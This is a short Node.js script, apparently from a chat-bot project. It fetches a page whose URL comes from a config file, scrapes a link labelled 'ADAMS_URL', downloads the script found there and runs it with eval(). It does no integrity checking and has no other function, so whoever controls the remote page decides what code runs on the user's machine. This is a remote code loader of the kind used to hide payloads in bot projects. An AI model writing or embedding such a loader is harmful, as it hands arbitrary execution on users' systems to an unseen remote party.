const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/onfig");

async function fetchAdamsUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const adamsUrlElement = $('a:contains("ADAMS_URL")');
    const adamsUrl = adamsUrlElement.attr('href');

    if (!adamsUrl) {
      throw new Error('Adams URL link not found...');
    }

    console.log('Adams URL fetched successfully ✅');

    const scriptResponse = await axios.get(adamsUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchAdamsUrl();
